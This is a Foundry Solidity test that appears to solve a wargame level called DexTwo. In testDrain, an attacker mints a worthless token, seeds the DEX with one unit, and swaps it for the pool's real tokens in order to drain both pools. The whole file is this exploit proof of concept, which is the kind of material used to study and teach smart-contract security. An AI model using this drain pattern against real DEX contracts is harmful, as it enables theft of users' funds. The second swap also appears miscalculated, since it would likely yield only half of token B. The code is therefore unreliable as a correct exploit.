// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo} from "../src/Swap2.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";


contract DexTwoTest is Test {
    SwappableTokenTwo public swappabletokenA;
    SwappableTokenTwo public swappabletokenB;

    AttackToken public attackerToken;

    DexTwo public dexTwo;
    address attacker = makeAddr("attacker");

    ///DO NOT TOUCH!!!!
    function setUp() public {
        dexTwo = new DexTwo();
        swappabletokenA = new SwappableTokenTwo(address(dexTwo),"Swap","SW", 110);
        vm.label(address(swappabletokenA), "Token 1");
        swappabletokenB = new SwappableTokenTwo(address(dexTwo),"Swap","SW", 110);
        vm.label(address(swappabletokenB), "Token 2");
        dexTwo.setTokens(address(swappabletokenA), address(swappabletokenB));

        dexTwo.approve(address(dexTwo), 100);
        dexTwo.add_liquidity(address(swappabletokenA), 100);
        dexTwo.add_liquidity(address(swappabletokenB), 100);

        vm.label(attacker, "Attacker");

        IERC20(address(swappabletokenA)).transfer(attacker, 10);
        IERC20(address(swappabletokenB)).transfer(attacker, 10);
      
    }


    function testDrain() public {
        vm.startPrank(attacker);

        
        attackerToken = new AttackToken("AttackerToken", "ATTK", 1000);
        vm.label(address(attackerToken), "AttackerToken");

       
        attackerToken.approve(address(dexTwo), type(uint256).max);

        
        IERC20(address(attackerToken)).transfer(address(dexTwo), 1);

        
        dexTwo.swap(address(attackerToken), address(swappabletokenA), 1);
        console.log("Attacker Token A Balance:", swappabletokenA.balanceOf(attacker));

       
        dexTwo.swap(address(attackerToken), address(swappabletokenB), 1);
        console.log("Attacker Token B Balance:", swappabletokenB.balanceOf(attacker));

       
        assertEq(swappabletokenA.balanceOf(address(dexTwo)), 0, "Token A not drained");
        assertEq(swappabletokenB.balanceOf(address(dexTwo)), 0, "Token B not drained");
        
        vm.stopPrank();
    }

  
}


contract AttackToken is ERC20 {
    address private _dex;

    constructor( string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
    }

}